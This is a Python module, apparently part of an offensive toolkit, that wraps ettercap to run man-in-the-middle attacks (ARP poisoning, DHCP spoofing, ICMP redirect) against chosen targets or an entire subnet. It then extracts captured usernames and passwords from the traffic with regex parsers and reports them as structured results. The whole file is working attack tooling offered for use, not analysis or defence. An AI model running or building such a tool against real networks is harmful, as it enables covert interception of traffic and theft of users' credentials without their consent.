#!/usr/bin/env python3
"""
MITM Framework Module — ettercap wrapper.

Performs man-in-the-middle attacks using ettercap. Supports ARP poisoning,
DHCP spoofing, and ICMP redirect modes. Captures credentials from cleartext
protocols visible in the traffic stream.

REQUIRES ROOT — ARP/DHCP manipulation requires raw socket access.
"""

import argparse
import re
from typing import Any

from base_module import TacticalModule


_VALID_MODES = ("arp", "dhcp", "icmp")


class MitmFramework(TacticalModule):
    """Run man-in-the-middle attacks via ettercap."""

    name: str = "mitm_framework"
    description: str = (
        "MITM attack framework using ettercap. "
        "Modes: arp (ARP poison), dhcp (DHCP spoof), icmp (ICMP redirect). "
        "REQUIRES ROOT."
    )

    def _add_module_args(self) -> None:
        """Register MITM framework arguments."""
        self.parser.add_argument(
            "--interface",
            required=True,
            help="Network interface to perform MITM on (e.g. eth0)",
        )
        self.parser.add_argument(
            "--target1",
            default="",
            help="First target IP or range (empty = entire subnet for ARP mode)",
        )
        self.parser.add_argument(
            "--target2",
            default="",
            help="Second target IP (gateway) for ARP mode",
        )
        self.parser.add_argument(
            "--mode",
            choices=list(_VALID_MODES),
            default="arp",
            help="MITM mode: arp, dhcp, or icmp (default: arp)",
        )
        self.parser.add_argument(
            "--duration",
            type=int,
            default=60,
            help="Attack duration in seconds (default: 60)",
        )
        self.parser.add_argument(
            "--filter",
            default="",
            help="Ettercap content filter file path (.ef compiled filter)",
        )
        self.parser.add_argument(
            "--plugins",
            nargs="*",
            default=[],
            help="Ettercap plugins to load (e.g. dns_spoof chk_poison)",
        )

    # ── Validation ───────────────────────────────────────────────────

    def _validate_args(self, args: argparse.Namespace) -> None:
        """Validate all arguments and ensure root privileges."""
        if not self.check_root():
            return  # check_root calls output_error which exits

        if not self.validate_interface(args.interface):
            self.output_error(f"Invalid interface name: {args.interface!r}")

        if not self.check_interface_exists(args.interface):
            self.output_error(f"Interface {args.interface!r} not found on system.")

        if args.target1 and not self._validate_target(args.target1):
            self.output_error(
                f"Invalid target1: {args.target1!r}. Must be IP or CIDR."
            )

        if args.target2 and not self._validate_target(args.target2):
            self.output_error(
                f"Invalid target2: {args.target2!r}. Must be IP or CIDR."
            )

        if args.mode == "arp" and not args.target1:
            self.logger.warning(
                "No target1 specified — ARP poisoning entire subnet. Use with caution."
            )

        if args.duration < 5 or args.duration > 3600:
            self.output_error(f"Duration must be 5–3600 seconds, got {args.duration}.")

        if args.filter:
            from pathlib import Path
            if not Path(args.filter).exists():
                self.output_error(f"Filter file not found: {args.filter!r}")

    @staticmethod
    def _validate_target(target: str) -> bool:
        """Validate target as IP or CIDR."""
        if "/" in target:
            return TacticalModule.validate_cidr(target)
        return TacticalModule.validate_ip(target)

    # ── Command builder ──────────────────────────────────────────────

    def _build_ettercap_args(self, args: argparse.Namespace) -> list[str]:
        """
        Build ettercap argument list.

        ettercap unified syntax:
            ettercap -T -i <iface> -M arp:remote /<t1>// /<t2>//
        """
        ettercap_args: list[str] = [
            "-T",                   # text interface (no GUI)
            "-q",                   # quiet — reduce noise
            "-i", args.interface,
        ]

        # MITM mode flag
        if args.mode == "arp":
            ettercap_args.extend(["-M", "arp:remote"])
        elif args.mode == "dhcp":
            # DHCP spoofing: inject fake DHCP responses
            ettercap_args.extend(["-M", "dhcp"])
        elif args.mode == "icmp":
            # ICMP redirect: requires gateway MAC
            ettercap_args.extend(["-M", "icmp"])

        # Content filter
        if args.filter:
            ettercap_args.extend(["-F", args.filter])

        # Plugins
        for plugin in args.plugins:
            ettercap_args.extend(["-P", plugin])

        # Targets (ettercap format: /IP/MAC/PORT)
        t1 = f"/{args.target1}//" if args.target1 else "//"
        t2 = f"/{args.target2}//" if args.target2 else "//"

        if args.mode == "arp":
            ettercap_args.extend([t1, t2])

        return ettercap_args

    # ── Output parsing ───────────────────────────────────────────────

    def _parse_credentials(self, stdout: str, stderr: str) -> list[dict[str, Any]]:
        """
        Extract captured credentials from ettercap output.

        Ettercap prints credentials in formats like:
            FTP: 192.168.1.x:21 -> USER: admin PASS: secret
            HTTP: 192.168.1.x:80 -> USER: admin PASS: secret
        """
        credentials: list[dict[str, Any]] = []
        combined = stdout + "\n" + stderr

        # Pattern: PROTOCOL : IP:PORT -> USER: ... PASS: ...
        cred_pattern = re.compile(
            r"(\w+)\s*:?\s*([\d.]+):(\d+)\s*[-–>]+\s*"
            r"USER(?:NAME)?\s*:\s*(\S+)\s+"
            r"PASS(?:WORD)?\s*:\s*(\S+)",
            re.IGNORECASE,
        )
        for match in cred_pattern.finditer(combined):
            credentials.append({
                "protocol": match.group(1).upper(),
                "host": match.group(2),
                "port": int(match.group(3)),
                "username": match.group(4),
                "password": match.group(5),
            })

        # Alternative pattern: ettercap dissector output
        dissector_pattern = re.compile(
            r"-+\s*(\w+)\s*-+\n.*?(\d+\.\d+\.\d+\.\d+):(\d+).*?"
            r"(?:user|login):\s*(\S+).*?(?:pass|password):\s*(\S+)",
            re.IGNORECASE | re.DOTALL,
        )
        for match in dissector_pattern.finditer(combined):
            # Avoid duplicates
            entry = {
                "protocol": match.group(1).upper(),
                "host": match.group(2),
                "port": int(match.group(3)),
                "username": match.group(4),
                "password": match.group(5),
            }
            if entry not in credentials:
                credentials.append(entry)

        return credentials

    def _parse_connection_count(self, stdout: str, stderr: str) -> int:
        """Count intercepted connections from ettercap output."""
        combined = stdout + "\n" + stderr
        # Each captured session shows "Connecting to..."  or similar
        return len(re.findall(r"(Connecting|intercepted|captured|sniffed)", combined, re.IGNORECASE))

    # ── Main run ─────────────────────────────────────────────────────

    def run(self, args: argparse.Namespace) -> None:
        """Execute ettercap MITM attack and parse results."""
        self._validate_args(args)

        ettercap_args = self._build_ettercap_args(args)
        self.logger.info(
            "Starting MITM (%s mode) on %s for %ds",
            args.mode,
            args.interface,
            args.duration,
        )

        stdout, stderr = self.run_tool_popen(
            "ettercap",
            ettercap_args,
            duration=args.duration,
        )

        credentials = self._parse_credentials(stdout, stderr)
        connection_count = self._parse_connection_count(stdout, stderr)

        self.output_success({
            "interface": args.interface,
            "mode": args.mode,
            "target1": args.target1 or "(subnet)",
            "target2": args.target2 or "(gateway)",
            "duration_seconds": args.duration,
            "connections_intercepted": connection_count,
            "credentials_captured": credentials,
            "credential_count": len(credentials),
            "plugins_loaded": args.plugins,
        })


if __name__ == "__main__":
    MitmFramework().execute()
